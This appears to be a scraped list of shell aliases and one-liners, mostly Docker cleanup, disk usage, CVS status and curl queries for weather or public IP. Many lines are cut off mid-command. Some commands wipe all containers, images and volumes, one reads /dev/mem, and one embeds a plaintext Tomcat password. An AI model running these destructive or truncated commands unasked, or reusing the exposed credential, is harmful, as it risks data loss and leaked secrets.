docker-machine create ${{cookiecutter.envvar_prefix|upper}}_MACHINE_DRIVER $MACHINE_ENGINE_OPT ${{cookiecutter.envvar_prefix|upper}}_MACHINE
docker-kill-all || true && docker-purge
docker-kill-all || true && docker-clean-container
docker-compose kill || true && docker-compose rm -f
docker-compose down && docker volume rm v2_db-data || true && docker-compose up -d
docker-compose -f ${{cookiecutter.envvar_prefix|lower}}_docker_compose_common_path -f ${{cookiecutter.envvar_prefix|upper}}_DOCKER_COMPOSE_OVERRIDE_FILENAME
docker-compose -f $(ls -l | grep \.yml | awk
docker-cleanc || true && docker-cleani
docker-clean-containers || true && docker-clean-images
docker-clean-c || true && docker-clean-i
docker-clean || true && docker-clean-all-i && docker volume prune -f
docker volume rm $(docker volume ls -qf dangling=true) && docker ps -a | grep Exit | cut -d
docker volume ls | fzf | awk '{print \$2\
docker volume ls | cut -d ' ' -f16- | xargs docker volume rm
docker volume ls | awk '{print $2}' | grep -v
docker stop \$(status | awk 'NR != 1 {print \$2}' | fzy)
docker stop $(docker ps|tail -1|fawk NF)
docker stop $(docker ps -q) || true
docker stop $(docker ps -q) || docker rm $(docker ps -aq)
docker stop $(docker ps -a -q); docker rm $(docker ps -a -q | grep -v 52b62052b786); docker rmi $(docker images -q -f dangling=true | grep -v e72ac664f4f0)
docker stop $(dl | awk -F ' ' '{print $1}' | sed -n 2p)
docker stats --no-stream | sort -k8 -hr | more
docker stats $(docker ps -a | tail -n +2 | awk
docker start xhgui-mongo || docker run --name xhgui-mongo -p 27017:27017 -d mongo && sudo phpenmod profiler && sudo service php7.0-fpm restart
docker start \$(status | awk 'NR != 1 {print \$2}' | fzy)
docker start -i $(docker ps -a|grep irssi|awk '{print $1}')
docker run --name postgres -e POSTGRES_PASSWORD=$(< ~/.today_local | grep 'POSTGRESQL_PASSWORD=' | sed
docker rmi `docker images | grep 'none' | awk '/ / { print $3 }'`
docker rmi \`docker images|grep none|awk '{print \$3}'\`
docker rmi \`docker images | grep none | cut -f1 -d$'\t'\`
docker rmi \$(docker images|grep '^<none>'|awk '{print\$3}')
docker rmi \$(docker images | grep '^<none>\' | awk \'{ print $2}\')
docker rmi \$(docker images | grep '^<none>' | awk '{print $3}')
docker rmi \$(docker images | grep '^<none>' | awk '{ print $3 }')
docker rmi \$(docker images | grep '<none>' | awk '{print $3}')
docker rmi -f \$(docker images | grep '^<none>' | awk '{print $3}') 2>/dev/null
docker rmi -f $(docker images | grep none | awk '{print $3}')
docker rmi -f $(docker images | grep '<none>' | awk '{print $3}')
docker rmi --force $(docker images -a | awk '{print $3}' | grep -v IMAGE)
docker rmi $(docker images|tail -n +2|awk
docker rmi $(docker images | grep ``^<none>`` | awk ``{print $3}``)
docker rmi $(docker images | grep '^<none>' | awk '{print $3}')
docker rmi $(docker images | fzf | awk
docker rmi $(docker images | awk '{print $3}' | awk '{if(NR>1)print}')
docker rmi $(docker images -q) || true
docker rmi $(docker images -a | grep none | awk '{print $3}')
docker rmi $(docker images -a | grep '^<none>' | awk '{print $3}')
docker rmi $(docker images --filter 'dangling=true' -q --no-trunc) && docker rmi $(docker images | grep 'none' | awk '/ / { print $3 }')
docker rm `dpsa| peco | cut -f 1`
docker rm `docker ps -a | grep Exit | awk '{ print $1 }'`
docker rm \$(docker ps -a | awk \'$2~/^[^/]+$/ {print $1}\' | tail -n+2)
docker rm -f `docker ps -a | grep madratman | awk '{print $1}'`
docker rm -f `docker ps -a | awk '{print $1}' | tail -n +2`
docker rm -f \`docker ps -a | awk '{print \$1}' | tail -n +2\`
docker rm -f $(docker ps | grep latest | awk '{print $1}')
docker rm -f $(docker ps -aq) || true
docker rm -f $(docker ps -aq) >/dev/null 2>&1 || true
docker rm -f $(docker ps -a -q) || docker rmi -f $(docker images -q)
docker rm --force $(docker ps -a | awk '{print $1}' | grep -v CONTAINER)
docker rm $(docker ps -a|grep irssi|awk '{print $1}')
docker rm $(docker ps -aq); docker rmi $(docker images | grep '^<none>' | awk '{print $3}')
docker rm $(docker ps -a | grep 'Exited' | awk '{ print $1 }')
docker rm $(docker ps -a -q) || true
docker rm $(docker ps -a -q) && docker rmi -f $(docker images -q) || docker rmi -f $(docker images -q)
docker rm $(docker ps -a -q) && docker rmi $(docker images -q) && docker ps -a | cut -c-12 | xargs docker rm
docker restart \$(status | awk 'NR != 1 {print \$2}' | fzy)
docker restart $(docker ps|grep startup|cut -c-12)
docker restart $(docker ps -a | grep mongo | awk '{print $1}')
docker ps | tail -n +2 | while read con im com cre stat port name; do docker unpause $con; done
docker ps | tail -n +2 | while read con im com cre stat port name; do docker pause $con; done
docker ps | grep backend_staging | awk '{print $1; exit}'
docker ps | grep -v CONTAINER | awk '\''{print $1}'\''
docker ps | grep -v CONTAINER | awk
docker ps | fzf | read id rest; docker rm $id -f
docker ps | fzf | read id rest; docker exec -it $id bash
docker ps | awk '{print $1}' | xargs docker stop
docker ps | awk '{ print $1 }' | xargs docker kill
docker ps | awk 'FNR>1{print \$1}' | xargs docker stop
docker ps | ag oracle | awk
docker ps -qa | xargs docker rm -f; docker images -qa | xargs docker rmi -f
docker ps -qa | xargs docker rm -f ; docker images -qa | xargs docker rmi -f
docker ps -qa | xargs docker kill ; docker ps -qa | xargs docker rm; docker system prune -f
docker ps -qa | awk '{ print $1 }' | xargs docker rm -f
docker ps -q | xargs docker stop | xargs docker rm
docker ps -q | xargs docker stop -t 2 | xargs docker rm -v
docker ps -q | xargs docker kill; docker ps -qa | xargs docker rm
docker ps -q | xargs docker kill && docker ps -aq | xargs docker rm -f
docker ps -q | xargs -n 1 docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{ .Name }}' | sed 's/ \//\t/'
docker ps -q | xargs -n 1 docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{ .Name }}' | sed 's/ \// /'
docker ps -q | xargs -n 1 docker inspect --format '{{ .NetworkSettings.IPAddress }} {{ .Name }}' | sed 's/ \// /'
docker ps -q | xargs -I {} docker kill {} | xargs -L 1 docker rm {}
docker ps -q | grep -v weave | xargs docker inspect --format '{{ .Name }} {{ .NetworkSettings.Networks.weave.IPAddress }}'
docker ps -q | awk '{print $1}' | xargs -o docker stop
docker ps -q -a | xargs docker stop && docker ps -q -a | xargs docker rm
docker ps -l -q | xargs docker stop | xargs docker rm
docker ps -f status=exited | grep -v CONTAINER | awk
docker ps -f status=exited -f status=created | tail -n +2 | awk
docker ps -aqf status=exited|xargs docker rm && docker images -qf dangling=true|xargs docker rmi
docker ps -aq | xargs docker stop; docker ps -aq | xargs docker rm
docker ps -aq | xargs docker stop | xargs docker rm 2>/dev/null
docker ps -aq | xargs docker stop | xargs docker rm
docker ps -aq | xargs docker stop && docker ps -aq | xargs docker rm
docker ps -aq | xargs docker rm -f;docker images -q | xargs docker rmi
docker ps -aq | xargs docker rm -f; docker images -aq | xargs docker rmi; docker volume prune
docker ps -aq | xargs docker rm -f; docker images -aq | xargs docker rmi -f
docker ps -aq | xargs docker kill && docker ps -a -q | xargs docker rm
docker ps -aq | xargs --no-run-if-empty docker stop | xargs --no-run-if-empty docker rm -v
docker ps -aq | awk '{print $1}' | xargs docker rm -f
docker ps -a | tail -n +2 | grep
docker ps -a | tail -n +2 | cut -f1 -d
docker ps -a | grep carlili_web | awk '{print \$16}'
docker ps -a | grep Exited | awk
docker ps -a | grep Exit | cut -d
docker ps -a | grep -v CONTAINER | awk
docker ps -a | cut -c-12 | xargs docker rm
docker ps -a | awk '{print \$1}' | xargs docker rm -v
docker ps -a | awk '{print \$1}' | xargs docker rm
docker ps -a | awk '{print \$1}' | xargs docker kill
docker ps -a | awk '{print \$1}' | tail -n +2
docker ps -a | awk '{print $1}' | xargs docker rm -f
docker ps -a | awk '{print $1}' | xargs docker rm
docker ps -a | awk '{print $1}' | xargs -I {} docker kill {}
docker ps -a | awk 'NR > 1{print $1}' | xargs docker stop > /dev/null 2>&1
docker ps -a | awk 'NR > 1 {print $1}' | xargs docker rm -f; docker rmi $(docker images -q -f dangling=true)
docker ps -a | awk '/Exited/ {print $1}' | xargs docker rm -v
docker ps -a | awk '/Exit/ {print $1}' | xargs docker rm
docker ps -a -q | xargs docker stop && docker ps -a -q | xargs docker rm
docker ps -a -q | xargs -n1 docker stop && docker ps -a -q | xargs -n1 docker rm
docker ps -a -q | grep -v consul | xargs docker rm -f
docker ps -a -q | awk '{print $1}' | xargs -L 1 -r docker stop
docker ps -a -q | awk '{print $1}' | xargs -L 1 -r docker rm
docker ps -a -f status=exited -q | xargs docker rm && docker images -f dangling=true -q | xargs docker rmi
docker ps -a --format 'table {{.ID}} | {{.Status}} | {{.Names}}'
docker ps --all | tail -n 8 | awk -F
docker ps --all | awk '{print $1}' | xargs docker rm > /dev/null 2>&1
docker ps --all | awk '{print $1}' | xargs docker kill > /dev/null 2>&1
docker ps && echo && docker ps -a | grep Exited | wc -l && echo containers exited
docker network ls | grep 'week04' | xargs docker network rm
docker network ls | fzf | awk '{print \$1\
docker network ls -q | parallel docker network rm {} 2>&1 | grep -v 'cannot be removed'
docker logs dev-vault 2>1 | grep -e 'Root Token' | cut -f 3 -d ' '
docker logs --since 3h -f \$(status | awk 'NR != 1 {print \$2}' | fzy)
docker kill `dps| peco | cut -f 1`
docker kill `docker ps -aq` 2>/dev/null; docker rm `docker ps -aq` 2>/dev/null ||:
docker kill `ddps | peco | cut -f 1`
docker kill $(docker ps -q) 2>/dev/null || docker rm $(docker ps -a -q)
docker inspect `docker ps -l -q` | grep IPAddress | cut -d '\
docker inspect `dklcid` | grep IPAddress | cut -d '\
docker inspect --format '{{ .NetworkSettings.IPAddress }}' `docker ps | grep 3000/tcp | awk '{print $1}'`
docker images|sort|grep -v none
docker images|grep none|awk
docker images|awk '{print \$3}'|xargs -i docker rmi {}
docker images |grep -v REPOSITORY|awk
docker images |awk '{if(\$1=='<none>') print \$3}' | docker rmi
docker images | tail -n+2 | head -n10
docker images | sort -k 1 | less -S
docker images | peco | awk
docker images | grep SNAPSHOT | awk
docker images | grep -v TAG | awk
docker images | grep -v REPOSITORY | sort
docker images | grep -v REPOSITORY | awk
docker images | grep '^<none>' | awk '{print \$3}'
docker images | grep '^<none>' | awk '{print $3}'
docker images | fzf | read name tag rest ; sudo TEST_DRIVER_IMAGE=$name:$tag ./tts-run run-test-driver -f -w /opt/kaloom
docker images | fzf | read name tag rest ; docker run --rm -it $name:$tag bash
docker images | fzf | read name tag id rest; docker rmi $id -f
docker images | fzf | awk '{print \$1\
docker images | awk '{print \$3}' | tail -n +2
docker images | awk '{print $3}' | xargs docker rmi -f
docker images | awk '{print $3}' | xargs docker rmi
docker images | awk '{print $1}' | xargs -L1 docker pull
docker images | awk '{ print $3 }' | xargs docker rmi
docker images | awk '/none/ {print $3}' | xargs docker rmi -f
docker images | awk '/^<none>/ { print \$3 }' | xargs docker rmi
docker images | awk '/^<none>/ { print $3 }' | xargs docker rmi
docker images | awk '/<none>/ { print \$3 }' | xargs docker rmi
docker images | awk '/<none/{print $3}' | xargs docker rmi
docker images -q | xargs -I {} docker rmi -f {} && docker volume ls -q | xargs docker volume rm
docker images -q | awk '{print $1}' | xargs -L 1 -r docker rmi
docker images -aq | awk '{print $1}' | xargs docker rmi -f
docker images -aq -f dangling=true | xargs docker rmi --force && docker volume ls -qf dangling=true | xargs docker volume rm
docker images -a | awk '/<none/{print \$3}' | xargs docker rmi -f
docker images --no-trunc| grep none | awk
docker images --format '{{.Size}}\t{{.Repository}}:{{.Tag}}\t{{.ID}}' | sort -hr | column -t
docker images --format '{{.Size}}\t{{.Repository}}:{{.Tag}}\t{{.ID}}' | sort -h | column -t
docker images --all | awk '/^<none>/ {print $3}' | xargs docker rmi
docker image rmi $(docker images | grep none | awk '{print $3}')
docker image rm $(docker image ls --all --quiet 2>/dev/null || sudo docker image ls --all --quiet)
docker image ls | grep 'week04' | xargs docker image rm
docker image ls | grep 'git-tester' | xargs docker image rm && docker image prune
docker image ls | grep 'charliecalvert/gitignore' | xargs docker image rm && docker image prune
docker image ls -q | head -n 1 | pbcopy
docker exec -ti docker_webclientdev_1 sudo tail -f /var/log/nginx/error.log | tr '\n' '\0' | xargs -0IL date +\
docker exec -ti docker_webclientdev_1 sudo tail -f /var/log/nginx/access.log | tr '\n' '\0' | xargs -0IL date +\
docker exec -ti -w /var/www/html/lbo_symfony$(pwd | awk -F 'lbo_symfony' '{print $2}' | awk -F 'vendor' '{print $1}') lbo_engine bash
docker exec -ti $(docker ps|grep startup|cut -c-12) /bin/bash
docker exec -t -i $(docker ps|tail -1|fawk NF) /bin/bash
docker exec -it `dps| peco | cut -f 1` /bin/bash
docker exec -it `dps | peco | cut -f 1` /bin/bash
docker exec -it `docker ps |grep keywords-by-country | awk '{print $1}'` bash
docker exec -it `docker ps -a | grep -i up | awk
docker exec -it `ddps | peco | cut -f 1` /bin/bash
docker exec -it `ddps | fzf | cut -f 1` /bin/bash
docker exec -it \`docker container ls | tail -n1 | awk '{print \$1}'\` bash
docker exec -it $(docker ps | grep user-service | awk '{print $1}') bash
docker exec -it $(docker ps | grep maxg_dev | awk '{print $1}') bash
docker exec -it $(docker ps | grep 'gestprev-api' | awk '{print $1}') /bin/bash
docker exec -it $(docker ps -a | grep redis | cut -d ' ' -f 1) redis-cli
docker exec -it $(docker ps -a | grep mysql | cut -d ' ' -f 1) mysql
docker exec -it $( docker ps | fzf | awk
docker exec $(docker ps -a | grep phpfpm | cut -d ' ' -f 1) php
docker exec $(docker ps -a | grep phpfpm | cut -d ' ' -f 1) composer
docker container top \`docker container ls | tail -n1 | awk '{print \$1}'\`
docker container stop \`docker container ls | tail -n1 | awk '{print \$1}'\`
docker container stop $(docker ps -qa) || echo 'There is no containers'
docker container stop $(docker ps -a | grep Exited | awk '{print $1 }')
docker container rm -f \$(docker container ls -a|grep -v CONTAINER|awk '{print \$1}')
docker container rm $(docker ps -qa) || echo 'There is no containers'
docker container rm $(docker ps -a | grep Exited | awk '{print $1 }')
docker container rm $(docker container ls -aq) -f || docker image rm $(docker image ls -q) -f
docker container rm $(docker container ls --all --quiet 2>/dev/null || sudo docker container ls --all --quiet)
docker container ls -aq | xargs docker container stop; docker container ls -aq | xargs docker rm
docker container ls -a | grep -v CONT | awk
docker container kill dockly || true && docker rm dockly
docker container kill $(docker container ls --all --quiet 2>/dev/null || sudo docker container ls --all --quiet); \
docker attach $(docker ps | grep 'bundle exec rails s' | tr -s
doas ifconfig wlan scan | awk '/chan/ { print $4 }' | sort -n
doas cu -r -s 115200 -l cuaU0||sudo minicom -D /dev/ttyUSB0
do() { docker rmi `docker images | grep '^<none>' | awk '{print $3}'`; };
dnf || true
dmesg | tail -n 50 | ccze -A
dmesg | tail -n 300 | ccze -A
dmesg | tail -n 30 | ccze -A
dmesg | tail -n 22 | ccze -A
dmesg | tail -n 200 | ccze -A
dmesg | tail -n 20 | ccze -A
dmesg | grep -i acpi | grep -i supports
dmesg | grep -E 'sd[abcd]' | grep -E '[TG]i?B'
dmesg -t debug | tail | sed -re 's/^(\[[^]]+\]) /\1\n/'
dmesg --notime | grep -i hypervisor | cut -d
dkls |grep zixia |awk '{print $1}' > wcpid
dk image ls | awk '{print \$3}' | awk 'NR==2'
django createsuperuser --username=admin --email=admin@example.com || django createsuperuser --email=admin@example.com
disown -a -r -h; ps auxww | grep vvv | more
diskutil unmount /Volumes/TMbackup || (diskutil unmount force /Volumes/TMbackup)
diskutil list | grep FB64 | awk
diskutil list | awk '/external/ { print \$1 }' | xargs -tn1 diskutil unmountDisk
diskutil info / | GREP -iE 'Available|Free'
dirs | tolines | number-lines
dirs | sed -r 's/\s/\\ /' | xclip
dirs | sed 's/ /\n/g' | awk 'BEGIN{print \
dirs -v|head|tac
dirs -vl | sort -nr | tail -n10
dirs -v |sed '/^ 0 /d' |xargs echo
dirs -v | head -n 10 | sort -k 2
dirs -v | head -9 | tail -8
dirs -v | head -10 | ~/.prettify/prettify
dirs -v | head -10 | tac
dir=$(mktemp -d) || return
dig mx @CDSHELL_DNS_LOCAL || dig www.google.com.br @8.8.8.8
dig @ns1.google.com -t txt o-o.myaddr.l.google.com +short -4 | sed 's/|//g'
dig +short myip.opendns.com @resolver1.opendns.com || curl -f4L http://ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com 2> /dev/null || echo none
diffbr -I '\\$\(Revision\|Date\|Author\): . .. \\$'
diff-tree | rg '^A| [^.]+$'
diff <(cd dir1 && find | sort) <(cd dir2 && find | sort)
diff <(cd $1 && find | sort) <(cd $2 && find | sort)
diff -U 0 $1 $2 | grep -v ^@ | wc -l
diA | awk '{print \$3}' | xargs $dock_prefix docker rmi
dfs log --pretty=format: --name-only --diff-filter=A | sort - | sed '/^$/d'
dfc || alias df='df -h'
dfc -d | grep /dev/sda && dfc -d | grep /dev/sdb
dfc -Tdsq name || df
df -lh | egrep 'nvme0n1(p6|p7)'
df -h|head -1;df -h|grep ^/
df -h|grep -v ^/ |grep -v ^tmpfs
df -hl | grep /dev/sd | sort
df -hT | grep -e 'File' -e '\/sd[a-z][0-9]' --color=never | body sort
df -hT | egrep /tmp$ | egrep [[:digit:]]*%
df -h |grep /dev/sda\|Avail
df -h |grep /dev/sd |sort
df -h |grep /dev/disk |grep G
df -h | tail -n 8 | sort
df -h | tail -n +2 | sort -rgk 5
df -h | tail -n +2 | cut -d \ -f1
df -h | grep var | grep -v run
df -h | grep home | sed -e 's/\([^ ]*[ ]*\)\{3\}\([^ ]*\)\([ ]*[^ ]*\)\{2\}/\2/g'
df -h | grep /sda6 | cut -c 35-38
df -h | grep /mnt/c && df -h | grep /mnt/s
df -h | grep /dev/disk2 | awk '{print \$4}'
df -h | grep /dev/disk1s1 | awk
df -h | grep /dev/ | sort
df -h | grep /dev/ | awk
df -h | grep /$ | cut -c 41-43
df -h | grep -v tmpfs | grep -v loop
df -h | grep --color=never -E '^(/dev|Filesystem)'
df -h | grep --color=never '^\/dev\/.*' | sort
df -h | grep --color=never 'Used\|root'
df -h | grep 'sda8\|sda7'
df -h 2>/dev/null | grep ^[\ F]| sed -e 's/^ \{20\}//' -e 's/^Filesystem \{10\}//'
df -h / | tail -n 1 | ruby -e \
df -h -x tmpfs -x devtmpfs | grep -vE '/var/lib/docker|loop'
df -Ph | grep LOCAL | cut -d' ' -f '9'
df -Ph . | tail -1 | awk '{print $4}'
df -BG |body sort -k 2nr | head -8
dep status -dot | dot -T png | open -f -a /Applications/Preview.app
dep status -dot | dot -T png | display
deluge-console info |G -B2 -A3 'State: Seeding'|G -A5 Name:.\*
deluge-console info |G -B2 -A3 'State: Queued'|G -A5 Name:.\*
deluge-console info |G -B2 -A3 'State: Downloading'|G -A5 Name:.\*
del(){ git br | grep $1 | xargs git br -D;};del
declare-f|grep'^[a-z].*()'|sed's/{$//'
declare -p ksc | grep -o '[A-Z][A-Z][A-Z][A-Za-z]*' | sort -d
declare -f | grep '^[a-z].* ()' | sed 's/{$//'
declare -f | grep '^[a-z].* () {' | sed 's/{$//'
declare -f | egrep '.* \(\) {' | grep -v '_'
declare -F | sort | grep -i
declare -F | sed '/^declare \-f \_.*$/d' | cat - <(echo -e \
declare -F git_prompt_toggle &>/dev/null && git_prompt_toggle || source ~/.bash-git-prompt/gitprompt.sh
deactivate; rmvirtualenv $(basename $(pwd)); mkvirtualenv $(basename $(pwd)) && pip install -r requirements-dev.txt || pip install -r requirements.txt
deactivate || : && tmux -2
deactivate 2> /dev/null || source deactivate
dd if=data.ab bs=1 skip=24 | openssl zlib -d | tar xvf -
dd if=/dev/urandom bs=64k count=1 2>/dev/null | sha512sum - | cut -d' ' -f 1
dd if=/dev/urandom bs=64k count=1 2>/dev/null | sha512sum - | cut -d ' ' -f 1
dd if=/dev/urandom bs=64k count=1 2>/dev/null | sha256sum - | cut -d' ' -f 1
dd if=/dev/urandom bs=64k count=1 2>/dev/null | sha256sum - | cut -d ' ' -f 1
dd if=/dev/urandom bs=64k count=1 2>/dev/null | md5sum - | cut -c 1-8
dd if=/dev/urandom bs=64 count=1 2>/dev/null | md5sum - | cut -d' ' -f 1
dd if=/dev/urandom bs=64 count=1 2>/dev/null | md5sum - | cut -d ' ' -f 1
dd if=/dev/urandom bs=32 count=1 2> /dev/null | sha256sum | cut -b
dd if=/dev/urandom bs=3 count=10 >> /dev/null 2>&1| md5sum | cut -c1-12
dd if=/dev/urandom bs=15 count=1 2>/dev/null | base64 | tr +/ __
dd if=/dev/random bs=16 count=1 2>/dev/null | base64 | sed 's/=//g'
dd if=/dev/random bs=16 count=1 2>/dev/null | base64 | sed
dd if=/dev/random bs=12 count=1 2>/dev/null | base64 | sed
dd if=/dev/random bs=1 count=64 2>/dev/null | base64 | tr -d '=\n'
dd if=/dev/mem|\cat|strings
dd if=/dev/mem | cat | strings
dd bs=512 skip=2048 count=10 if=$([ -e /dev/mmcblk0 ] && echo /dev/mmcblk0 || echo /dev/sda)
dcleanc || true && dcleani
dcid | xargs docker stop | xargs docker rm
dc ps | grep -Eio 'web_[0-9]+' | grep -Eo '[0-9]+'
date; cat /proc/interrupts) | md5sum | sed -r 's/^(.{10}).*$/\1/; s/([0-9a-f]{2})/\1:/g; s/:$//;
date | sha256sum | head -c 16 ; echo
date | sed 's/ /_/g' | xargs -n1 mkdir
date | md5 | pbcopy
date | md5 | cut -c1-16
date | figlet | lolcat
date | cowsay | lolcat
date -Is 2> /dev/null || date +%FT%T%z
date --iso-8601='seconds' | sed -r 's/[:]+/_/g' | sed 's/[T+]/__/g'
date +%s | tee >(tr -d '\n' | pbcopy)
date +%l:%M | figlet |cowsay -n
date && curl https://www.bitstamp.net/api/v2/ticker/btcusd/ | pretty | cowsay
d() { git diff --patch-with-stat HEAD~$1; }; git diff-index --quiet HEAD -- || clear; d
d | awk '\$2 ~ /_spec.rb$/ { print \$2 }' | xargs zeus test
d | awk '\$2 ~ /_spec.rb$/ { print \$2 }' | xargs bundle exec rspec
d images |grep -v REPOSITORY|awk
d -t | head \!* | tail
cx backup list --latest --stack ppl-management2 | grep -Eo '[0-9]{8}' | xargs -n1 cx backup download --stack ppl-management2
cvs status |grep File |grep -v Up-to
cvs status | grep Status: | grep -v Up-to-date
cvs status | grep File: | grep -v Up-to
cvs status | grep -E 'Status|^\?'
cvs status 2>/dev/null | grep ^File | grep -v Up-to
cvs stat | grep File | grep -v Up-to-date
cvs log | ruby -r ~/svn/devtools/ruby/cvs_log/cvs_log -e 'CVSLog.stdin' | view -
cvs -qn update | cut -c3- | xargs cvs -qn diff -w
cvs -q update -d -P 2>&1 | grep -v '\\(^U\\|is no longer in the repository$\\)'
cvs -q status | grep ^[?F] | grep -v \
cvs -q diff |grep Index| sed \
cvs -q diff --brief | grep Index | cut -f2 -d' '
cvs -n -Q status | grep File | grep -v Up-to-date
cut -f1 -d: | sort -u | xargs sed -i
cut -f 2 -d . - | base64 -D | jq
cut -d: -f1 | sort | uniq
cut -d';' -f2 ~/.histfile | rofi -dmenu | zsh
cut -d : -f 1 | sort | uniq
cut -d ':' -f 1 | sort | uniq
current_path=$(pwd) && rm -rf $KRATOS_PATH/build/$KRATOS_BUILD_TYPE $KRATOS_PATH/bin/$KRATOS_BUILD_TYPE cd $current_path || cd $current_path
current_path=$(pwd) && cd $KRATOS_PATH/kratos/python_scripts && python run_tests.py -c python -v2 && cd $current_path || cd $current_path
current_path=$(pwd) && cd $KRATOS_PATH/kratos/python_scripts && python run_tests.py -a $KRATOS_DEFAULT_TEST_APPLICATIONS -v2 -c python && cd $current_path || cd $current_path
current_path=$(pwd) && cd $KRATOS_PATH/cmake_build && mv configure.sh .. && mv README.md .. && rm -rf err.txt generated.file succ.txt && mv ../configure.sh . && mv ../README.md . && cd $current_path || cd $current_path
current_path=$(pwd) && cd $KRATOS_PATH && git pull && cd $current_path || cd $current_path
current_path=$(pwd) && cd $KRATOS_PATH && git branch && cd $current_path || cd $current_path
curl www.myip.se 2>/dev/null | grep 'Your IP addr' | sed 's/^.*: //;s/<.*$//'
curl wttr.in/~Brighton-Preston -s | tail +2 | head -n6; echo
curl wttr.in/Chicago | head -17 | lolcat
curl localhost:9990/shutdown && ps -ef | grep flock | while read n1 n2 n3 ; do kill -9 $n2 ; done
curl ipinfo.io/ip || (curl http://ipecho.net/plain; echo)
curl ifconfig.co/json --silent | json-pretty-print | json-pretty-color
curl ifconfig.co 2> /dev/null || echo 0.0.0.0
curl https://legiblenews.com | html2ps | ps2ascii
curl https://launchermeta.mojang.com/mc/game/version_manifest.json | jq .versions | jq -r '.[].id'
curl httpbin.org/ip 2>/dev/null | grep origin | cut -d '\
curl http://static.cricinfo.com/rss/livescores.xml >/dev/null 2>&1 | grep -m 1 'Sri Lanka' | grep -o -P '(?<=\>).*(?=\<)'
curl http://localhost:8080/lms/metrics/metrics --user 'tomcat:Wbhbrjd!952' -s | json | colout -t json
curl http://f.simplesideias.com.br/ip.php; echo; ifconfig | grep broadcast | sed 's/.*inet \(.*\) netmask.*/\1/'
curl http://bitcoin-otc.com/otps/DA2EEEBE15ABADED | gpg -d | pbcopy
curl -w '' -s canhazip.com | tee /dev/tty | pbcopy
curl -v --silent https://chaturbate.com/nixon_b/ 2>&1 | grep 'room_status' | xargs
curl -u '$jira_user:$jira_pass' -X GET -H 'Content-Type: application/json; charset=UTF-8' '$jira_domain/sr/jira.issueviews:searchrequest-xml/temp/SearchRequest.xml?jqlQuery=assignee%3D+$jira_user+AND+project+%3D+%22$jira_project%22+and+status+not+in+%28Done%2C+Closed%2C%22TO+TEST%22%29&tempMax=1000' 2> /dev/null | htmlentities | parseJira
curl -silent http://whatthecommit.com/ | grep '<p>'|sed s/'<p>'//
curl -sSL https://coinbase.com/api/v1/prices/historical | head -n 1 | sed \
curl -sS ipinfo.io/ip | tee /dev/tty | pbcopy
curl -sLN http://ai-radio.org/320.opus | opusdec - - | aplay -qfdat
curl -s www.climagic\.org/ascii/explodingcow-animation-1995.gz |zcat |pv -L2400 -q
curl -s www.bnb.bg | grep USD | awk -F
curl -s www.bnb.bg | grep GBP | awk -F
curl -s wttr.in|tail -n +8|head -n -2
curl -s wttr.in/~白井市 | head -37 | tail -30
curl -s wttr.in/~Stellenbosch | grep -v 'New fea' | grep -v Foll
curl -s wttr.in/purwoasri | head -37 | tail -30
curl -s wttr.in/perugia | head -37 | tail -30
curl -s wttr.in/copenhagen | head -37 | tail -30
curl -s wttr.in/Palma | head -n 37 && curl -s wttr.in/Moon | head -n 24
curl -s wttr.in/Jonestown | head -17 | tail -10
curl -s wttr.in/Hyderabad | head -37 | tail -30
curl -s wttr.in/Berlin | head -7 | tail -5
curl -s wttr.in/Atlanta | head -n 38 | tail -n 37
curl -s wttr.in/Atlanta | head -n 38 | tail -n -37
curl -s wttr.in | head -7 | tail -5
curl -s wttr.in | head -37 | tail -30
curl -s whatthecommit.com | grep '<p>' | sed 's/<p>//g'
curl -s rate.sx?qF | head -n -2 | tail -n +10
curl -s randomfunfacts.com | grep '<i>' | sed 's/.*<i>\(.*\)<\/i>.*/\1/'
curl -s randomfunfacts.com | grep '#FFFFFF' | sed 's#.*<strong><i>\(.*\)</i></strong>.*#\1#'
curl -s monip.org | iconv -f iso-8859-1 | sed -n 's/.*IP : \([0-9.]*\).*/\1/p'
curl -s ifconfig.me | tee /dev/stderr | pbcopy
curl -s https://www.kernel.org/finger_banner | head -1 | cut -c63-
curl -s https://wttr.in/~白井市 | head -37 | tail -30
curl -s https://icanhazip.com | tee /dev/tty | pbcopy
curl -s https://httpbin.davecheney.com/ip | jq .origin | sed s/\\\
curl -s https://docker.prod.walmart.com/v2/_catalog | jq '.repositories' | grep -i
curl -s https://api.github.com/orgs/$1/repos | jq .[].git_url | tr -d '\
curl -s https://api.coinmarketcap.com/v1/ticker/cardano/?convert=USD | jq '.[0].price_usd' | tr -d '\
curl -s https://api.coinmarketcap.com/v1/ticker/cardano/?convert=EUR | jq '.[0].price_eur' | tr -d '\
curl -s http://www.ip-adress.eu/ | grep My | sed 's/.*\
curl -s http://www.dtsc-wdyg.com.tw/web/ajax/check_po.jsp | jq -r '.Z1_1' | sed 's/[<b>\/]//g'
curl -s http://wttr.in/arb |head -n 17 |tail -n 10
curl -s http://wttr.in/Boston | head -7 | tail -5
curl -s http://wttr.in/ | head -17 | tail -n +8
curl -s http://whatthecommit.com/|html2text|sed '\$d'
curl -s http://ipecho.net/plain || echo -n 'no internet connection' ; echo
curl -s http://data.iana.org/TLD/tlds-alpha-by-domain.txt | grep -v XN | sed -e 1d -e 's/\(.*\)/\L\1/'
curl -s http://checkip.dyndns.org | tr -cd '[[:digit:].]' | pbcopy
curl -s http://127.0.0.1:$AE_LOCAL_INTERNAL_PORT/v2/account/pub-key|jq '.pub_key'|sed -e 's/\
curl -s clairemaindor.fr/cons |tail -n1 |awk '{print \$2}'
curl -s -F 'sprunge=<-' http://sprunge.us | tr -d '\n' | xclip
curl -s -F 'sprunge=<-' http://sprunge.us | perl -ne 'chomp and print' | xclip -selection c && xclip -o -selection c;echo
curl -s -F 'sprunge=<-' http://sprunge.us | perl -ne 'chomp and print' | xclip -selection c && xclip -o -selection c
curl -s -F 'sprunge=<-' http://pb.abhijeetr.com | perl -ne 'chomp and print' | xclip -selection c && xclip -o -selection c;echo
curl -s -A'Test' -L whatismyipaddress.com | grep IPv4: | grep -o '>[^<]*..<'
curl -s 'https://www.archlinux.org/mirrorlist/?country=FR&country=GB&protocol=https&use_mirror_status=on' | sed -e 's/^#Server/Server/' -e '/^#/d' | rankmirrors -n 5 -
curl -s 'http://xkcd.com/' | sed -n 's/Image URL.*: \(.*\)/\1/p' | feh -
curl -s 'http://whatthecommit.com/' -H 'Pragma: no-cache' | grep '<p>' | cut -c4-
